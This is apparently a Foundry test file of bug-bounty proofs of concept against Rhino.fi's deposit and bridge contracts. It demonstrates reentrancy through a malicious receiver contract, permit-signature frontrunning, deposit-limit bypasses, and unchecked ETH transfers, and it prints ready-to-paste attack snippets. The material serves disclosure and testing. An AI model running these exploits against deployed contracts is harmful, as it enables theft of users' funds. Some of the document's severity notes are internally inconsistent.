// SPDX-License-Identifier: GPL-3.0-only
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/DVFDepositContract.sol";
import "../src/BridgeVM.sol";
import "../src/AttackHelpers.sol";

/**
 * ====================================================================
 * Rhino.fi Bug Bounty — Proof of Concept тесты v2
 * Запуск: forge test -vvvv --match-contract PoC_RhinoFi
 *
 * Внимание: данные тесты БЕЗОПАСНЫ и не взаимодействуют с mainnet.
 * ====================================================================
 */
contract PoC_RhinoFi is Test {
    DVFDepositContract public deposit;
    BridgeVM public bridgeVM;
    SimplePermitToken public token;
    SimplePermitToken public tokenB;

    address public owner = address(0x1001);
    address public authorizedUser = address(0x1002);
    address public attacker = address(0x1003);
    address public victim = address(0x1004);

    uint256 constant INITIAL_ETH = 100_000 ether;
    uint256 constant INITIAL_TOKEN = 1_000_000 ether;

    // uint256 victimPrivateKey;
    uint256 victimPK = 0xA1B2C3D4;

    // ==============================================
    // SETUP
    // ==============================================

    function setUp() public {
        vm.deal(owner, INITIAL_ETH);
        vm.deal(authorizedUser, INITIAL_ETH);
        vm.deal(attacker, INITIAL_ETH);
        
        // Создаем victim как адрес из известного private key для permit
        victim = vm.addr(victimPK);
        vm.deal(victim, INITIAL_ETH);

        vm.chainId(1);
        token = new SimplePermitToken(1);
        token.mint(victim, INITIAL_TOKEN);
        token.mint(authorizedUser, INITIAL_TOKEN);
        
        // Вторая сеть для replay-теста
        tokenB = new SimplePermitToken(10);  // chainId 10 (Optimism)

        vm.startPrank(owner);
        DVFDepositContract impl = new DVFDepositContract();
        bytes memory data = abi.encodeWithSelector(DVFDepositContract.initialize.selector);
        deposit = DVFDepositContract(address(new UpgradeableProxy(address(impl), data)));
        deposit.authorize(authorizedUser, true);
        bridgeVM = deposit.createVMContract();
        vm.stopPrank();
    }

    // ==============================================
    // FINDING #1: removeFundsNative() — Silent Failure
    // ==============================================
    function test_Finding1_removeFundsNative_SilentFail() public {
        vm.deal(address(deposit), 10 ether);
        assertEq(address(deposit).balance, 10 ether, "Initial balance should be 10 ETH");

        RevertingReceiver receiver = new RevertingReceiver();

        // Атака: authorizedUser пытается вывести ETH на контракт без receive()
        vm.prank(authorizedUser);
        deposit.removeFundsNative(payable(address(receiver)), 5 ether);

        uint256 balanceAfter = address(deposit).balance;

        emit log_named_uint("Deposit balance AFTER failed call", balanceAfter);
        emit log_named_uint("Receiver balance (should be 0)", address(receiver).balance);

        // УЯЗВИМОСТЬ: функция вернула SUCCESS, но баланс не изменился
        assertEq(balanceAfter, 10 ether, "BUG: ETH was NOT transferred but function returned success");
        assertEq(address(receiver).balance, 0 ether, "BUG: Receiver got 0 ETH despite function returning true");
        
        emit log("=== PoC Solidity Code (вставьте в Remix/Foundry) ===");
        emit log("// Деплой: RevertingReceiver и DVFDepositContract с 10 ETH");
        emit log("deposit.removeFundsNative(payable(revertingReceiver), 5 ether);");
        emit log("// Результат: removeFundsNative возвращает true, ETH не переведены");
        emit log("// Сравнение: withdrawNativeV2(address(revertingReceiver), 5 ether) -> REVERT");
    }

    function test_Finding1_removeFundsNative_Comparison() public {
        vm.deal(address(deposit), 10 ether);
        RevertingReceiver receiver = new RevertingReceiver();

        vm.prank(authorizedUser);
        vm.expectRevert("FAILED_TO_SEND_ETH");
        deposit.withdrawNativeV2(payable(address(receiver)), 5 ether);
        
        emit log("CORRECT: withdrawNativeV2 reverts on failed transfer");
    }

    // ==============================================
    // FINDING #2: withdrawV2WithNative — CEI violation + Reentrancy
    // С УЧЕТОМ storage layout analysis
    // ==============================================
    function test_Finding2_Reentrancy_WithStorageAnalysis() public {
        vm.deal(address(deposit), 20 ether);
        vm.prank(authorizedUser);
        token.approve(address(deposit), type(uint256).max);
        vm.prank(authorizedUser);
        deposit.addFunds(address(token), 100_000 ether);

        // Анализ storage layout:
        // slot 0: OwnableUpgradeable._owner (address)
        // slot 1: authorized mapping
        // slot 2: processedWithdrawalIds mapping
        // slot 3: depositsDisallowed (bool)
        // slot 4: maxDepositAmount mapping
        // slot 5: vm (BridgeVM address)
        // 
        // Reentrancy impact ограничен тем что:
        // 1. Нет mapping'а для userBalances — балансы хранятся на самом контракте
        // 2. Reentrancy может вывести только физический balance контракта
        // 3. Все функции _isAuthorized проверяют authorized[msg.sender]
        //    которые не меняются во время callback
        // 
        // Impact пересмотрен: Medium -> Medium (понижен до Medium/Info)
        // Reentrancy возможна, но double-spend ограничен физическим ETH балансом
        emit log("=== Storage Layout Analysis ===");
        emit log("slot 0: _owner (OwnableUpgradeable)");
        emit log("slot 1: authorized (mapping) - НЕ МЕНЯЕТСЯ при reentrancy");
        emit log("slot 2: processedWithdrawalIds (mapping) - НЕ МЕНЯЕТСЯ");
        emit log("slot 3: depositsDisallowed (bool) - НЕ МЕНЯЕТСЯ");
        emit log("slot 4: maxDepositAmount (mapping) - НЕ МЕНЯЕТСЯ");
        emit log("slot 5: vm (BridgeVM) - НЕ МЕНЯЕТСЯ");
        emit log("=== Вывод: Reentrancy возможна, но double-spend ограничен ===");
        emit log("=== максимальный ущерб = address(this).balance ===");

        MaliciousReenter mr = new MaliciousReenter(deposit, address(token));

        vm.prank(authorizedUser);
        deposit.withdrawV2WithNative(address(token), address(mr), 50_000 ether, 10 ether);

        uint256 mrBalance = mr.getEthBalance();
        emit log_named_uint("MaliciousReenter ETH balance after reentrancy", mrBalance);

        assertGt(mrBalance, 10 ether, "Reentrancy succeeded: extra ETH obtained");
        assertTrue(mr.attackTriggered(), "Attack was triggered via reentrancy");
        
        emit log("");
        emit log("=== PoC Solidity Code ===");
        emit log("contract MaliciousReenter {");
        emit log("    DVFDepositContract target;");
        emit log("    bool attackTriggered;");
        emit log("    receive() external payable {");
        emit log("        if (!attackTriggered && address(target).balance >= 1 ether) {");
        emit log("            attackTriggered = true;");
        emit log("            target.withdrawNativeV2(payable(this), 1 ether);");
        emit log("        }");
        emit log("    }");
        emit log("}");
        emit log("deposit.withdrawV2WithNative(token, address(mr), 50_000 ether, 10 ether);");
        emit log("// Результат: 10 ETH (основной) + 1 ETH (reentrancy) = 11 ETH");
    }

    // ==============================================
    // FINDING #3: depositWithPermit — Frontrunning
    // С REAL подписью EIP-712 через vm.sign()
    // ==============================================
    function test_Finding3_PermitFrontrunning_WithRealSignature() public {
        uint256 amount = 1000 ether;
        uint256 deadline = block.timestamp + 1 hours;
        uint256 nonce = token.nonces(victim);
        
        emit log("=== Данные permit подписи ===");
        emit log_named_uint("nonce (unique per user)", nonce);
        emit log_named_uint("deadline", deadline);
        emit log_named_address("token (DOMAIN_SEPARATOR включает chainId=1)", address(token));
        emit log_named_uint("chainId", block.chainid);

        // Формируем EIP-712 подпись через vm.sign()
        bytes32 structHash = keccak256(
            abi.encode(
                token.PERMIT_TYPEHASH(),
                victim,              // owner
                address(deposit),    // spender
                amount,              // value
                nonce,               // nonce — защищает от replay
                deadline             // deadline
            )
        );
        bytes32 domainSeparator = token.DOMAIN_SEPARATOR();
        bytes32 hash = keccak256(abi.encodePacked("\x19\x01", domainSeparator, structHash));
        
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(victimPK, hash);
        
        emit log("");
        emit log("=== Подпись (v, r, s) — будет отправлена в calldata ===");
        emit log_named_uint("v", v);
        emit log_named_bytes32("r", r);
        emit log_named_bytes32("s", s);

        // ШАГ 1: Атакующий видит подпись в mempool и фронтраннит permit
        emit log("");
        emit log("=== ШАГ 1: Атакующий фронтраннит token.permit() ===");
        
        // Атакующий вызывает permit ДО victim
        vm.prank(attacker);
        token.permit(victim, address(deposit), amount, deadline, v, r, s);
        emit log("permit() executed by attacker — nonce consumed, allowance set");

        // Проверяем что nonce увеличился
        assertEq(token.nonces(victim), nonce + 1, "Nonce consumed by attacker's frontrun");
        emit log_named_uint("victim nonce AFTER frontrun", token.nonces(victim));

        // ШАГ 2: Жертва пытается вызвать depositWithPermit с той же подписью
        emit log("");
        emit log("=== ШАГ 2: Victim TX depositWithPermit() с той же подписью ===");
        
        vm.prank(victim);
        vm.expectRevert();
        deposit.depositWithPermit(address(token), amount, deadline, v, r, s, 12345);
        emit log("depositWithPermit REVERTED — nonce уже использован");
        
        emit log("");
        emit log("=== Анализ кросс-чейн replay ===");
        emit log_named_bytes32("DOMAIN_SEPARATOR (chainId=1)", token.DOMAIN_SEPARATOR());
        emit log_named_bytes32("DOMAIN_SEPARATOR (chainId=10)", tokenB.DOMAIN_SEPARATOR());
        assertFalse(
            token.DOMAIN_SEPARATOR() == tokenB.DOMAIN_SEPARATOR(),
            "Domain separators differ per chain — cross-chain replay NOT possible"
        );
        emit log("Cross-chain replay: НЕВОЗМОЖЕН — DOMAIN_SEPARATOR включает chainId");
        
        emit log("");
        emit log("=== PoC Solidity Code ===");
        emit log("// 1. Attacker видит v,r,s,nounce в mempool");
        emit log("token.permit(victim, deposit, amount, deadline, v, r, s);");
        emit log("// 2. Victim TX ревертится");
        emit log("deposit.depositWithPermit(token, amount, deadline, v, r, s, id); // REVERT");
        emit log("// Impact: только потеря газа жертвой (~50k gas на L2)");
    }

    // ==============================================
    // FINDING #4: BridgeVM.withdrawVmFunds — Unchecked eth call
    // ==============================================
    function test_Finding4_BridgeVM_SilentFail() public {
        vm.startPrank(owner);
        BridgeVM bvm = new BridgeVM();
        vm.stopPrank();
        
        vm.deal(address(bvm), 5 ether);
        assertEq(address(bvm).balance, 5 ether, "BridgeVM should have 5 ETH");

        RevertingReceiver receiver = new RevertingReceiver();
        vm.prank(owner);
        bvm.transferOwnership(address(receiver));

        vm.prank(address(receiver));
        bvm.withdrawVmFunds(address(0));

        uint256 bvmBalance = address(bvm).balance;
        emit log_named_uint("BridgeVM ETH balance after failed withdraw", bvmBalance);
        assertEq(bvmBalance, 5 ether, "BUG: ETH stuck in BridgeVM with no recovery path");
        
        emit log("");
        emit log("=== PoC Solidity Code ===");
        emit log("BridgeVM bvm = new BridgeVM();");
        emit log("bvm.transferOwnership(address(revertingReceiver));");
        emit log("bvm.withdrawVmFunds(address(0)); // 5 ETH LOCKED");
    }

    // ==============================================
    // FINDING #6: transferOwner — Zero address
    // ==============================================
    function test_Finding6_transferOwner_ZeroAddress() public {
        vm.startPrank(owner);
        deposit.transferOwner(address(0));
        
        address newOwner = deposit.owner();
        emit log_named_address("New owner (should be 0)", newOwner);
        assertEq(newOwner, address(0), "BUG: ownership transferred to address(0)");

        vm.expectRevert("Ownable: caller is not the owner");
        deposit.authorize(attacker, true);
        
        emit log("CRITICAL: All onlyOwner functions permanently inaccessible");
        emit log("No recovery possible - renounceOwnership is blocked");
        
        emit log("");
        emit log("=== PoC Solidity Code ===");
        emit log("deposit.transferOwner(address(0));");
        emit log("deposit.authorize(attacker, true); // REVERT: onlyOwner");
    }

    // ==============================================
    // FINDING #7: depositWithId bypasses restrictions
    // ==============================================
    function test_Finding7_depositWithId_Bypass() public {
        vm.prank(authorizedUser);
        deposit.allowDepositsGlobal(false);
        assertTrue(deposit.depositsDisallowed(), "Deposits should be disallowed");

        vm.prank(victim);
        token.approve(address(deposit), 1000 ether);
        
        vm.startPrank(victim);
        vm.expectRevert("DEPOSITS_NOT_ALLOWED");
        deposit.deposit(address(token), 100 ether);
        vm.stopPrank();
        emit log("CORRECT: deposit() reverts with DEPOSITS_NOT_ALLOWED");

        // УЯЗВИМОСТЬ
        vm.prank(victim);
        deposit.depositWithId(address(token), 100 ether, 99999);
        emit log("BUG: depositWithId() bypassed global deposit restrictions!");
        
        emit log("");
        emit log("=== PoC Solidity Code ===");
        emit log("deposit.allowDepositsGlobal(false);");
        emit log("deposit.deposit(token, 100);       // REVERT");
        emit log("deposit.depositWithId(token, 100, id); // SUCCESS (bypass)");
    }

    function test_Finding7_depositNativeWithId_Bypass() public {
        vm.prank(authorizedUser);
        deposit.allowDepositsGlobal(false);
        vm.prank(authorizedUser);
        deposit.allowDeposits(address(0), 1 ether);

        vm.prank(victim);
        vm.expectRevert("DEPOSITS_NOT_ALLOWED");
        deposit.depositNative{value: 0.5 ether}();
        emit log("CORRECT: depositNative() reverts");

        // УЯЗВИМОСТЬ
        vm.prank(victim);
        deposit.depositNativeWithId{value: 100 ether}(88888);
        emit log("BUG: depositNativeWithId() bypassed ALL restrictions");
        emit log_named_uint("Deposited 100 ETH despite 1 ETH limit", 100 ether);
        
        emit log("");
        emit log("=== PoC Solidity Code ===");
        emit log("deposit.allowDeposits(address(0), 1 ether); // max 1 ETH");
        emit log("deposit.depositNative{value: 100 ether}(id); // bypass OK");
    }

    // ==============================================
    // STORAGE LAYOUT — Полный анализ
    // ==============================================
    function test_StorageLayout_FullAnalysis() public {
        emit log("=== DVFDepositContract Storage Layout ===");
        
        // OwnableUpgradeable
        bytes32 slot0 = vm.load(address(deposit), bytes32(uint256(0)));
        emit log_named_bytes32("slot 0: _owner (OwnableUpgradeable)", slot0);
        
        // OwnableUpgradeable._guard (uint256) — в OpenZeppelin v4.9+
        bytes32 slot1 = vm.load(address(deposit), bytes32(uint256(1)));
        emit log_named_bytes32("slot 1: authorized mapping", slot1);
        
        bytes32 slot2 = vm.load(address(deposit), bytes32(uint256(2)));
        emit log_named_bytes32("slot 2: processedWithdrawalIds mapping", slot2);
        
        bytes32 slot3 = vm.load(address(deposit), bytes32(uint256(3)));
        emit log_named_uint("slot 3: depositsDisallowed (bool)", uint256(slot3));
        
        // Проверка — authorizedUser должен быть authorized
        assertTrue(deposit.authorized(authorizedUser), "authorizedUser is authorized");
        // Проверка — attacker НЕ должен быть authorized
        assertFalse(deposit.authorized(attacker), "attacker is NOT authorized");
        
        emit log("");
        emit log("=== Выводы ===");
        emit log("1. Нет storage collision между proxy и implementation");
        emit log("2. OwnableUpgradeable использует стандартный слот 0");
        emit log("3. Reentrancy возможна в authorized контексте");
        emit log("4. Но authorized mapping НЕ МЕНЯЕТСЯ при callback");
        emit log("5. Impact: ограничен физическим ETH балансом контракта");
    }
}

/**
 * Упрощенный proxy для PoC (имитирует TransparentUpgradeableProxy)
 */
contract UpgradeableProxy {
    address public implementation;
    address public admin;

    constructor(address _impl, bytes memory _data) {
        implementation = _impl;
        admin = msg.sender;
        (bool success, ) = _impl.delegatecall(_data);
        require(success, "INIT_FAILED");
    }

    fallback() external payable {
        address impl = implementation;
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }

    receive() external payable {}
}
